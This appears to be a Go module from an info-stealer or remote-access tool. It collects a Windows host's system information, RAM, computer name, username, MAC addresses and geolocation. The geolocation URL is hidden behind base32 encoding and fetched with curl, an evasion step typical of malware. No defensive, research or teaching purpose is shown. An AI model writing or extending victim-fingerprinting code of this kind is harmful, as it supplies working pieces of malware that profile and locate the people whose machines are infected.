package computer

import (
	"encoding/base32"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
)

func GetInformation() string {
	cmd := exec.Command("cmd", "/C", "systeminfo")
	output, err := cmd.Output()
	if err != nil {
		return "Error"
	}
	return string(output)
}

func GetPCName() string {
	return os.Getenv("COMPUTERNAME")
}

func GetRAM() string {
	cmd := exec.Command("cmd", "/C", "wmic", "computersystem", "get", "TotalPhysicalMemory")
	output, err := cmd.Output()
	// body := strings.Split(string(output), "\n")
	// for _, line := range body {
	// 	if strings.Contains(line, "TotalPhysicalMemory") {
	// 	} else {
	// 		return "Ram: " + line + " MB"
	// 	}
	// }
	if err != nil {
		return "Error"
	}
	return strings.Replace(string(output), "\n", "", -1)
}

type ipApi struct {
	Ip      string `json:"ip"`
	City    string `json:"city"`
	Leader  string `json:"region"`
	Country string `json:"country"` //country code
	Loc     string `json:"loc"`     //latitude,longitude
	Org     string `json:"org"`
}

func GIL() string {
	api := "NB2HI4DTHIXS62LQNFXGM3ZONFXS6==="
	newapi := base32.NewDecoder(base32.StdEncoding, strings.NewReader(api))
	buf := new(strings.Builder)
	_, err := io.Copy(buf, newapi)
	if err != nil {
		fmt.Println(err)
	}

	cmd := exec.Command("cmd", "/C", "curl", buf.String())
	output, err := cmd.Output()
	if err != nil {
		return "Error"
	}
	//parse json
	var ip ipApi
	json.Unmarshal([]byte(string(output)), &ip)
	return ip.City + ", " + ip.Leader + ", " + ip.Country + ", " + ip.Org
}

func GetUserName() string {
	return os.Getenv("USERNAME")
}

func GetMAC() []string {
	macs := []string{}
	netInterface, _ := net.Interfaces()
	for _, netInterface := range netInterface {
		macs = append(macs, netInterface.HardwareAddr.String())
	}

	return macs
}
